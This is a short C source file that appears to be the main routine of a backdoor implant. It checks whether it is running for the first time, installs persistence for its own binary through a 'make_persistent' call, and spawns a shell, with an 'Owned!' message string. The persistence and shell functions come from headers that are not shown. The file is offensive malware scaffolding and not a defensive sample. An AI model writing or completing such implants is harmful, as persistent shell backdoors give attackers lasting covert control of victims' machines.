#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#include "connection.h"
#include "persistency.h"


int main(int argc, char** argv){
	int socket;
	char msg[] = "Owned!\n";


	if(is_first_exec(argv[0])){
		if(make_persistent(argv[0])){
			spawn_shell(true); // true to signal persistency
		}else{
			printf("persitent\n");
			spawn_shell(false);
		}
	}

	spawn_shell(true);

	return 0;
}





